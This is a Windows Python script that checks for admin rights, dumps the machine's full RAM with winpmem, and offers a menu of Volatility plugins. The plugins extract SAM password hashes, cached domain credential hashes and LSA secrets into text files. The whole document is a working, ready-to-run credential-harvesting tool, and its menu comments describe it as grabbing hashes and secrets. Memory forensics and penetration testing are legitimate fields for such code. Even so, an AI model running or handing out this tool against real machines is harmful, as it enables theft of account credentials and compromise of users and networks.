import os
import time
import psutil
import shutil
import subprocess
import ctypes
import sys

def is_admin():
    """Check if the script is running with Administrator permissions."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_ram_size_gb():
    """Get the size of the RAM in GB."""
    ram_bytes = psutil.virtual_memory().total
    ram_gb = ram_bytes / (1024 ** 3)
    return ram_gb

def get_file_size_gb(file_path):
    """Get the size of the specified file in GB."""
    if os.path.exists(file_path):
        file_bytes = os.path.getsize(file_path)
        file_gb = file_bytes / (1024 ** 3)
        return file_gb
    return 0

def get_free_space_gb(folder):
    """Get the free space in GB for the given folder."""
    total, used, free = shutil.disk_usage(folder)
    free_gb = free / (1024 ** 3)
    return free_gb

def prompt_user():
    """Prompt the user to select an option."""
    print("\nPlease select an option:")
    print("1. SAM dump #Grab common windows hashes (SAM+SYSTEM)")
    print("2. Cache dump #Grab domain cache hashes inside the registry")
    print("3. Lsass dump #Grab lsa secrets")
    print("4. ALL (Run SAM dump, Cache dump, and Lsass dump)")
    print("5. Delete mem.raw")
    print("6. Exit")
    
    choice = input("Enter your choice (1/2/3/4/5/6): ").strip()
    return choice

def run_volatility(choice):
    """Run the appropriate Volatility command based on user choice."""
    commands = {
        '1': ["vol.exe", "-l", "sam_dump.txt", "-f", "mem.raw", "windows.hashdump.Hashdump"],
        '2': ["vol.exe", "-l", "cache_dump.txt", "-f", "mem.raw", "windows.cachedump.Cachedump"],
        '3': ["vol.exe", "-l", "lsass_dump.txt", "-f", "mem.raw", "windows.lsadump.Lsadump"],
        '4': [
            ["vol.exe", "-l", "sam_dump.txt", "-f", "mem.raw", "windows.hashdump.Hashdump"],
            ["vol.exe", "-l", "cache_dump.txt", "-f", "mem.raw", "windows.cachedump.Cachedump"],
            ["vol.exe", "-l", "lsass_dump.txt", "-f", "mem.raw", "windows.lsadump.Lsadump"]
        ]
    }

    if choice in commands:
        if choice == '4':
            for cmd in commands[choice]:
                try:
                    subprocess.run(cmd, check=True)
                    print(f"Command {' '.join(cmd)} executed successfully.")
                except subprocess.CalledProcessError as e:
                    print(f"Error running command {' '.join(cmd)}: {e}")
        else:
            try:
                subprocess.run(commands[choice], check=True)
                print("Command executed successfully.")
            except subprocess.CalledProcessError as e:
                print(f"Error running command: {e}")
    elif choice == '5':
        if os.path.exists("mem.raw"):
            os.remove("mem.raw")
            print("mem.raw file deleted successfully.")
        else:
            print("mem.raw file does not exist.")
    elif choice == '6':
        print("Exiting the script.")
        sys.exit(0)
    else:
        print("Invalid choice. Please try again.")

def main():
    if not is_admin():
        print("Script is not running with Administrator permissions. Please rerun the script as an Administrator.")
        return

    ram_size_gb = get_ram_size_gb()
    free_space_gb = get_free_space_gb('.')
    required_space_gb = ram_size_gb + 2

    print(f"RAM size: {ram_size_gb:.2f} GB")
    print(f"Free space: {free_space_gb:.2f} GB")
    print(f"Required space: {required_space_gb:.2f} GB (With some headroom)")

    if free_space_gb >= required_space_gb:
        print("There is enough space.")
        run_dump = input("Do you want to run a memory dump? (y/n): ").strip().lower()
        if run_dump != 'y':
            print("Exiting the script.")
            return
        subprocess.run(["./winpmem_mini_x64_rc2.exe", "mem.raw"])
        print("Executable ran successfully.")
    else:
        print("Not enough space to save the file.")
        return

    mem_raw_size_gb = get_file_size_gb("mem.raw")

    if mem_raw_size_gb >= ram_size_gb:
        print(f"mem.raw file size: {mem_raw_size_gb:.2f} GB")
        time.sleep(3)
        while True:
            choice = prompt_user()
            run_volatility(choice)
    else:
        print("mem.raw file is smaller than the RAM size. No further action taken.")

if __name__ == "__main__":
    main()
